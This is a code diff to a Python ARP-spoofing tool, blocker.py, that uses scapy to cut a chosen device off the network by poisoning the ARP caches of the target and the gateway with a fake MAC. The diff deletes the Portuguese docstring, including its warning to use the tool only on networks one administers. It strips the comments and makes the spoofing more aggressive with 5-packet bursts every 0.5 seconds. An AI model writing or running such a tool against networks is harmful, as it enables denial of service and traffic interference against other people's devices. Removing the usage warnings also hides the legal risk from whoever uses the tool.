@@ -1,55 +1,31 @@
-"""
-blocker.py — corta o acesso de um dispositivo à internet na SUA rede.
-
-Técnica: ARP spoofing direcionado. Enviamos continuamente respostas ARP
-falsas dizendo ao aparelho-alvo que o roteador (gateway) está num MAC que
-não existe, de modo que o tráfego dele não chega a lugar nenhum. Ao parar,
-restauramos a tabela ARP correta e o aparelho volta ao normal.
-
-⚠️  Use somente em redes que você administra. Interferir no tráfego de
-    redes de terceiros é ilegal na maioria dos países.
-
-Observações:
- - O bloqueio só vale enquanto o programa está rodando.
- - É "reversível": parar o bloqueio devolve o acesso.
- - Para bloqueio permanente, o ideal é filtrar o MAC no roteador (veja o README).
-"""
-
 import threading
 import time
 
 from scapy.all import ARP, Ether, srp, send, getmacbyip, conf, get_if_addr
 
+_SPOOF_INTERVAL = 0.5
+_BURST = 5
+
 
 def _get_gateway_ip():
-    """Descobre o IP do gateway (roteador) a partir da tabela de rotas."""
     try:
-        # conf.route.route("0.0.0.0") -> (interface, ip_saida, gateway)
         gw = conf.route.route("0.0.0.0")[2]
         if gw and gw != "0.0.0.0":
             return gw
     except Exception:
         pass
-    # fallback comum em redes domésticas: .1 da própria sub-rede
     local = get_if_addr(conf.iface)
     return ".".join(local.split(".")[:3]) + ".1"
 
 
 class Blocker:
-    """Gerencia bloqueios ativos, um por MAC-alvo."""
-
     def __init__(self):
-        self._threads = {}   # mac -> Thread
-        self._stop = {}      # mac -> Event
+        self._threads = {}
+        self._stop = {}
         self.gateway_ip = _get_gateway_ip()
         self.gateway_mac = getmacbyip(self.gateway_ip)
 
     def refresh_gateway(self):
-        """Reobtém IP e MAC do roteador (útil se a rede subiu depois do app).
-
-        Devolve o MAC do gateway, ou None se não deu para resolver — nesse caso
-        o bloqueio via ARP não tem como cortar o caminho de volta com segurança.
-        """
         self.gateway_ip = _get_gateway_ip()
         if not self.gateway_mac:
             try:
@@ -68,24 +44,19 @@ class Blocker:
         return getmacbyip(target_ip)
 
     def _spoof_loop(self, target_ip, target_mac, stop_event):
-        """Envia ARP falso a cada 2s enquanto o bloqueio estiver ligado."""
-        # Diz ao alvo: "o gateway sou eu" com um MAC inexistente -> buraco negro.
         fake_mac = "de:ad:be:ef:00:01"
         while not stop_event.is_set():
-            # para o alvo: gateway_ip está em fake_mac
             send(ARP(op=2, pdst=target_ip, hwdst=target_mac,
                      psrc=self.gateway_ip, hwsrc=fake_mac),
-                 verbose=False)
-            # para o gateway: alvo está em fake_mac (corta o caminho de volta)
+                 count=_BURST, verbose=False)
             if self.gateway_mac:
                 send(ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac,
                          psrc=target_ip, hwsrc=fake_mac),
-                     verbose=False)
-            stop_event.wait(2)
+                     count=_BURST, verbose=False)
+            stop_event.wait(_SPOOF_INTERVAL)
         self._restore(target_ip, target_mac)
 
     def _restore(self, target_ip, target_mac):
-        """Reenvia ARP correto algumas vezes para o alvo reconectar rápido."""
         if not self.gateway_mac:
             return
         for _ in range(5):
